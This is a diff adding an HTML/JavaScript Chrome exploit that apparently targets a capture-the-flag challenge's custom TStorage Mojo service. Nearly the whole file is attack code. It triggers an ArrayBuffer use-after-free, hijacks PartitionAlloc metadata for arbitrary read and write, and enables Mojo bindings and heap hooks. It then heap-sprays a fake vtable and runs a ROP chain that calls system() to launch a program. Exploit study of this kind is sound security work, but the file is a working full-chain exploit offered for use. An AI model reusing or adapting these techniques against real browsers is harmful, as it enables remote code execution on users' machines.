@@ -1,0 +1,416 @@
+<html>
+	<pre id='log'></pre>
+	<script src="mojojs/mojo_bindings.js"></script>
+    <script src="mojojs/third_party/blink/public/mojom/tstorage/tstorage.mojom.js"></script>
+	<script>
+const ENABLE_NATIVE = 1;
+
+function success(msg) {
+    console.log("[+] "+msg);
+    document.body.innerText += "[+] "+msg+'\n'; 
+}
+
+function fail(msg){
+    console.log("[-] "+msg);
+    document.body.innerText += "[-] "+msg+'\n'; 
+}
+
+function success_value(msg, value) {
+    console.log("[+] "+msg+hex(value));
+    document.body.innerText += "[+] "+msg+hex(value)+'\n'; 
+}
+
+function hex(i){
+	return '0x'+i.toString(16);
+}
+
+function gc(){
+	for(let i = 0; i < 1024 * 1024 * 16; i++){
+		let a = new String;
+	}
+}
+
+function free(ab){
+	try{	
+		if (ENABLE_NATIVE) {
+        		eval("%ArrayBufferDetach(ab);");
+    		}
+		else{
+			let w = new Worker('');
+			w.postMessage({ab: ab}, [ab]);
+			w.terminate();
+		}
+	}catch(err){
+		fail("free buffer failed");
+	}
+}
+
+var util_ab = new ArrayBuffer(0x20);
+var util_float64 = new Float64Array(util_ab);
+var util_biguint64 = new BigUint64Array(util_ab);
+
+function f2i(f){
+	util_float64[0] = f;
+	return util_biguint64[0];	
+}
+
+function i2f(i){
+	util_biguint64[0] = i;
+	return util_float64[0];	
+}
+
+function swap(x) {
+    let result = BigInt(0);
+    let tmp = x;
+    for (let i = 0; i < 8; i++) {
+            result = result << BigInt(8);
+            result += tmp & BigInt(0xFF);
+            tmp = tmp >> BigInt(8);
+    }
+    return result;
+}
+
+function getSuperPageBase(addr) {
+	let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
+	let superPageBaseMask = ~superPageOffsetMask;
+	let superPageBase = addr & superPageBaseMask;
+	return superPageBase;
+}
+ 
+function getPartitionPageBaseWithinSuperPage(addr, partitionPageIndex) {
+	let superPageBase = getSuperPageBase(addr);
+	let partitionPageBase = partitionPageIndex << BigInt(14);
+	let finalAddr = superPageBase + partitionPageBase;
+	return finalAddr;
+}
+ 
+function getPartitionPageIndex(addr) {
+	let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
+	let partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14);
+	return partitionPageIndex;
+}
+ 
+function getMetadataAreaBaseFromPartitionSuperPage(addr) {
+	let superPageBase = getSuperPageBase(addr);
+	let systemPageSize = BigInt(0x1000);
+	return superPageBase + systemPageSize;
+}
+ 
+function getPartitionPageMetadataArea(addr) {
+	let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
+	let partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14);
+	let pageMetadataSize = BigInt(0x20);
+	let partitionPageMetadataPtr = getMetadataAreaBaseFromPartitionSuperPage(addr) + partitionPageIndex * pageMetadataSize;
+	return partitionPageMetadataPtr;
+}
+
+function checkMojo(){
+	if(typeof(Mojo) == "undefined"){
+		success("Mojo is NOT enabled");
+		return 0;
+	}
+	else{
+		success("Mojo is ENABLED");
+		return 1;
+	}
+}
+
+async function debug(){
+	for(let j = 0; j < 0x100000; j++){
+			var x = 1;
+		for(let i = 0; i < 0x10000; i++){
+			var x = x + i;
+		}
+	}
+
+}
+
+async function pwn(){
+
+	success("Start pwn()");
+
+	var mojo_check = checkMojo();
+
+	if(mojo_check == 0){
+		var arry_size = 1;
+
+		var uaf = new Float64Array(arry_size).fill(i2f(0x747474747474n));
+		var leaks = new Float64Array(arry_size);
+		%DebugPrint(uaf);
+		%DebugPrint(uaf.buffer);
+		//debug();
+		await free(uaf.buffer);
+		success("free buffers");
+		//debug();
+		for(let i = 0; i < 3; i++){
+			gc();
+		}
+		success("gc");
+		%DebugPrint(uaf.buffer);
+		%DebugPrint(uaf);
+		%DebugPrint(leaks);
+		%DebugPrint(leaks.buffer);
+		gar = []
+		//debug();
+		for(let i = 0; i < 800000; i++){
+			gar.push(new Float64Array(0x20).fill(13.37));
+		}
+		success("magic");
+		//debug();
+		leaks.set(uaf, 0);
+		leak_value = f2i(leaks[0]);
+		if(leak_value == 0x747474747474n){
+			throw 1;
+		}
+		success_value("leaked pointer: ", leak_value);
+
+		leak_value = swap(leak_value);
+		success_value("swaped pointer: ", leak_value);
+
+		var superpage_base = getSuperPageBase(leak_value);
+		success_value("super page base: ", superpage_base);
+
+		var partition_page_index = getPartitionPageIndex(leak_value);
+		success_value("partiton page index: ", partition_page_index);
+
+		var part_page = getPartitionPageBaseWithinSuperPage(leak_value, partition_page_index);
+		success_value("part page: ", part_page);
+
+		var metadata_base = getMetadataAreaBaseFromPartitionSuperPage(leak_value);
+		success_value("metadata base: ", metadata_base);
+
+		var metadata_area = getPartitionPageMetadataArea(leak_value);
+		success_value("metadata area: ", metadata_area);
+
+
+		leaks[0] = i2f(swap(BigInt(metadata_area)));
+		uaf.set(leaks, 0);
+		success("hijack uaf'fd to metadata_area");
+
+		// uas all free slot, assume only alloc 1 time
+		bins = []
+		count = 0
+		for(let i = 0; i < 100000; i++){
+			leaks.set(uaf, 0);
+			var tmp_fd = f2i(leaks[0]);
+			if(tmp_fd != 0){
+				bins.push(new ArrayBuffer(8*arry_size));
+				count = count + 1;
+			}
+			else{
+				break;
+			}
+		}
+		if(count > 90000){
+			throw 2;
+		}
+		console.log('[+] after', hex(count), 'try fd = null');
+		leaks.set(uaf, 0);
+
+		try{
+			var metadata = new BigUint64Array(new ArrayBuffer(8));
+			success("should over metadata now");
+		}
+		catch(error){
+			throw 100;
+		}
+
+		// arbitrary read and write
+		function read64(addr){
+			metadata[0] = addr;
+			var tmp_obj = new BigUint64Array(new ArrayBuffer(8));
+			var leaked = swap(metadata[0]);
+			tmp_obj[0] = BigInt(leaked);
+			return leaked;
+		}
+
+		var code_leak = read64(BigInt(metadata_area)+0x10n);
+		success_value("code leak: ", code_leak);
+		var code_base = code_leak-0xaa246a8n;
+		success_value("code base: ", code_base);
+
+		function write64(addr, value){
+			metadata[0] = addr;
+			var tmp_obj = new BigUint64Array(new ArrayBuffer(8));
+			tmp_obj[0] = value;
+		}
+
+		var mojo_enabled = code_base+0xaa57325n;
+		var hooks_enabled = code_base+0xa8f8848n;
+		var free_override_hook = code_base+0xa8f8868n;
+		success_value('mojo_enabled: ', mojo_enabled);
+		success_value('hooks_enabled: ', hooks_enabled);
+		success_value('free_override_hook: ', free_override_hook);
+		var ret_func = code_leak-0xcd7598n;
+		success_value('ret: ', ret_func);
+
+		// 1. set mojo enabled
+		write64(BigInt(mojo_enabled), 1n);
+		success("set mojo_enabled to true");
+		// 2. set hook enabled
+		write64(BigInt(hooks_enabled), 1n);
+		success("set hooks_enabled to true");
+		// 3, set free hook a empty function(ret)
+		write64(BigInt(free_override_hook), BigInt(ret_func));
+		success("set free_override_hook an empty function");
+
+		window.location.reload();
+		success("reload windows");
+		success("Finished first part");
+	}
+	else{
+		function print(msg) {
+		    console.log(msg);
+		    document.body.innerText += msg + '\n'; 
+		}
+
+		function print_value(msg, value) {
+		    console.log(msg+hex(value));
+		    document.body.innerText += msg + hex(value) + '\n'; 
+		}
+
+		var ts_ptr = new blink.mojom.TStoragePtr();
+		Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(ts_ptr).handle);
+		await ts_ptr.init();
+		// now we can createInstance
+		var ti_ptr = (await ts_ptr.createInstance()).instance;
+
+		// get libc leak and .text leak
+		var libc_leak = (await ts_ptr.getLibcAddress()).addr;
+		print_value("[+] Libc leak: ", libc_leak);
+		// print(hex(libc_leak));
+		var text_leak = (await ts_ptr.getTextAddress()).addr;
+		print_value("[+] Text leak: ", text_leak);
+		// print(hex(text_leak));
+		var libc_base = libc_leak-0x40730;
+		print_value("[+] Libc base: ", libc_base);
+		// print(hex(libc_base));
+		var system = libc_base+0x4f4e0;
+		print_value("[+] system: ", system);
+		var malloc_hook = libc_base+0x3ebc30;
+		var free_hok = libc_base+0x3ed8e8;
+
+		var text_base = text_leak-0x39b5e60;
+		print_value("[+] code base: ", text_base);
+		var bss = text_leak+0x6ec6fe0;
+		print_value("[+] Target bss: ", bss);
+
+		// var xchg = text_base+0x7fde8e4;
+		var xchg = text_base+0x7fde8a4;
+		print_value("[+] xchg gadget: ", xchg);
+
+		A = []; // many many TInstance (inner_db_)
+		B = []; // many many TStorage (inner_db_ptr_)
+		C = []; // also many many TInstance for heap spray
+
+		var list_size = 10;
+
+		for(let i = 0; i < list_size; i++){
+			B.push(null); // init B[i]
+			B[i] = new blink.mojom.TStoragePtr();
+			Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(B[i]).handle);
+			await B[i].init();
+			A.push((await B[i].createInstance()).instance);
+		}
+
+		for(var i = 0; i < list_size; i++){
+			var tmp_ts_ptr = new blink.mojom.TStoragePtr();
+			Mojo.bindInterface(blink.mojom.TStorage.name, mojo.makeRequest(tmp_ts_ptr).handle);
+			await tmp_ts_ptr.init();
+			C.push((await tmp_ts_ptr.createInstance()).instance);
+		}
+
+		// reset TStorage->inner_db_ptr_ in B[]
+		for(var i = 0; i < list_size; i++){
+			await B[i].ptr.reset();
+		}
+
+		print("[+] Prepaired for heap spray");
+
+		for(var idx = 0; idx < list_size; idx++){
+			for(var i = 0; i < 200; i++){
+				C[idx].set(i, 0x1000+i);
+			}
+			for(var i = 0; i < 79-1; i++){
+				await C[idx].push(0x10000+i);
+			} // capacity = 79
+			for(var i = 0; i < 39; i++){
+				await C[idx].pop();
+			} // capacity = 49
+			for(var i = 0; i < 76-40; i++){
+				await C[idx].push(0x20000+i);
+			} // capacity = 76
+			for(var i = 0; i < 38; i++){
+				await C[idx].pop();
+			} // capacity = 47
+			for(var i = 0; i < 51; i++){
+				if(i != 8){
+					await C[idx].push(0x30000+i);
+				}
+				else{
+					await C[idx].push(bss); // vtable entry
+				}
+			} // capacity = 89
+			for(var i = 0; i < 45; i++){
+				await C[idx].pop();
+			} // capacity = 56
+			for(var i = 0; i < 163-5; i++){
+				await C[idx].push(0x40000+i);
+			}
+			await C[idx].push(bss-8);        // buffer_
+			await C[idx].push(0xcf);         // capacity_
+			await C[idx].push(0);            // index_
+			await C[idx].push(1);            // end_
+			await C[idx].push(0x74747474);   // int_value_
+		}
+
+		print("[+] Heap spray finished");
+
+		// var binsh = libc_base+0x1b40fa;
+
+		var pop_rdi_ret = text_base+0xa1b18ab; //0x2e9ee1d;
+		var ret = text_base+0xa1b18ab+1; //0x2d3eac9;
+		var pop_rax_ret = text_base+0x9604b47; //0x2d815fc;
+		var mov_rdi_al_pop_rbp_ret = text_base+0x2f9d9f9; //0x527c945;
+
+		for(var idx = 0; idx < list_size; idx++){
+			var temp = (await A[idx].getInt()).value;
+			if(temp == 0x74747474){
+				print_value("[+] Find target: ", idx);
+				var target = A[idx];
+				await target.push(ret);
+				await target.push(pop_rdi_ret); // passing xchg gadget
+				await target.push(xchg);
+				// var cmd = './flag_printer\x00';
+				var cmd = 'gnome-calculator\x00';
+				var cmd_buf = bss+0x500;
+				for(var cmd_idx = 0; cmd_idx < cmd.length; cmd_idx++){
+					await target.push(pop_rdi_ret);
+					await target.push(cmd_buf+cmd_idx); // address
+					await target.push(pop_rax_ret);
+					await target.push(cmd.charCodeAt(cmd_idx));
+					await target.push(mov_rdi_al_pop_rbp_ret); // cmd[idx]
+					await target.push(0x21212121); // fake rbp
+				}
+
+				// system(cmd)
+				await target.push(pop_rdi_ret);
+				// await target.push(binsh);
+				await target.push(cmd_buf);
+				await target.push(ret);
+				await target.push(system);
+
+				print("[+] Trigger!");
+				await target.getTotalSize();
+			}
+		}
+
+
+	}
+
+}
+
+pwn();
+
+	</script>
+</html>
